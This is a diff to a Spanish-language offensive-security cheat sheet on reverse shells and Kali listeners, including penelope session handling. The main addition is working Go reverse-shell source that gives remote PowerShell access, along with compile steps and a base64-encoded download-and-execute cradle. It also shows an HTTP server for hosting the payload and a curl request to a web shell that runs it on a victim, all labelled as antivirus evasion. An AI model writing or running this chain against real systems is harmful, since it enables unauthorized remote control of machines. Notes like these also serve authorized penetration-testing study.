@@ -30,8 +30,9 @@ Forward Shell  → via mkfifo → cuando reverse y bind están bloqueados por fi
 ## 1. LISTENERS EN KALI
 
 ```bash
-❯ sudo apt install penelope    # Instalar la tool (Mejor hasta ahora)
-❯ penelope -p 443     # Recibir la revershell 
+❯ penelope -p 443     # Recibir la revershell    <- MEJOR OPCIÓN 
+	❯ Ctrl + d        # En caso de tener más sesiones en el mismo listener haacer un detach y regresar al menú de Penelope
+	❯ sessions 2      # Ingresar a la sesión 2 
 
 ❯ nc -nlvp 443
 # Linux → shell básica
@@ -181,7 +182,50 @@ NOTA:
 # Diseñado para evadir AMSI y soluciones AV
 ```
 
-### PowerShell indetectable
+### Revershell Go para Windows  - Evasión 
+```powershell 
+Paso 1:
+# Crear el archivo para compilar la reverhsell '0xb0b.go' en Kali
+
+	package main
+	
+	import (
+	    "net"
+	    "os/exec"
+	)
+	
+	func main() {
+	    c, _ := net.Dial("tcp", "IP_Kali:443")
+	    cmd := exec.Command("powershell")
+	    cmd.Stdin = c
+	    cmd.Stdout = c
+	    cmd.Stderr = c
+	    cmd.Run()
+	}
+
+Paso 2:
+# Compilar la revershell en Kali 
+❯ GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -o 0xb0b.exe 0xb0b.go
+
+Paso 3:
+# Comando para encodear en Kali con base64 la revershell
+❯ printf '%s' 'IWR http://IP_Kali/0xb0b.exe -OutFile $env:TEMP\0xb0b.exe; Start-Process $env:TEMP\0xb0b.exe' | iconv -f UTF-8 -t UTF-16LE | base64 -w 0
+
+Paso 4:
+# Compartir el archivo '0xb0b.exe'
+❯ python -m http.server 80
+
+Paso 5: 
+# Ponerse en escucha con Penelope
+❯ penelope -p 443
+
+Paso 6:
+# Ejecutar el comando para descargar la revershell en el server víctima y obtener la revershell 
+❯ curl 'http://IP_server/shell.php?cmd=powershell.exe+-e+BASE64...' 
+```
+
+
+### PowerShell indetectable Windows - Evasión 
 ```powershell
 # Funcion encargada de convertir un arreglo de bytes y lo convierte en una cadena utilizando la codificacion especificada, como UTF-8
 function ConvertFrom-ByteArray {
